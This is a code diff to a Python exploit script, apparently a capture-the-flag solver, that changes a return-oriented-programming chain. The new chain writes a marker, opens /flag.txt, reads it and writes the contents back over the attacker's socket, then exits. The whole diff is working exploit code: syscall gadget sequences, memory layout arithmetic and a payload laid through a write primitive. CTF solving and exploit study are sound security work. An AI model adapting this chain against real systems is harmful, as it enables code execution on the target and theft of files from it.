@@ -335,19 +335,24 @@ def exploit(host, port, cand):
     log("[*] gadgets rdi=0x%x rsi=0x%x rdx=0x%x rax=0x%x sys=0x%x"
         % (g_rdi, g_rsi, g_rdx, g_rax, g_sys))
 
-    # open("/flag.txt",0) -> read(fd,buf,100) -> write(clientfd,buf,100) -> exit
-    PATH, BUF = object(), object()
-    rop = [g_rdi, PATH, g_rsi, 0, g_rdx, 0, g_rax, 2, g_sys,          # open
+    # write(cfd,MARK,7) -> open("/flag.txt",0) -> read(cfd+1,buf,100)
+    #                   -> write(cfd,buf,100) -> exit
+    MARK, PATH, BUF = object(), object(), object()
+    rop = [g_rdi, cfd, g_rsi, MARK, g_rdx, 7, g_rax, 1, g_sys,         # write marker
+           g_rdi, PATH, g_rsi, 0, g_rdx, 0, g_rax, 2, g_sys,          # open
            g_rdi, cfd + 1, g_rsi, BUF, g_rdx, 100, g_rax, 0, g_sys,   # read (fd = cfd+1)
-           g_rdi, cfd, g_rsi, BUF, g_rdx, 100, g_rax, 1, g_sys,       # write -> our socket
+           g_rdi, cfd, g_rsi, BUF, g_rdx, 100, g_rax, 1, g_sys,       # write flag
            g_rax, 60, g_sys]                                          # exit
-    path_addr = retslot + len(rop) * 8
+    mark_addr = retslot + len(rop) * 8
+    path_addr = mark_addr + 8
     buf_addr = path_addr + 16
-    rop = [path_addr if x is PATH else buf_addr if x is BUF else x for x in rop]
+    rop = [mark_addr if x is MARK else path_addr if x is PATH else
+           buf_addr if x is BUF else x for x in rop]
     chain = b"".join(struct.pack("<Q", x) for x in rop)
-    chain += b"/flag.txt\x00".ljust(16, b"\x00") + b"\x00" * 112
+    chain += b"ROP_OK\n\x00" + b"/flag.txt\x00".ljust(16, b"\x00") + b"\x00" * 112
 
     tail = forge_write(host, port, retslot, chain)          # lay chain + trigger
+    log("[*] cand %d finale resp %d bytes: %r" % (cand, len(tail), tail[:80]))
     m = FLAG_RE.search(tail)
     return m.group(0).decode() if m else None
 
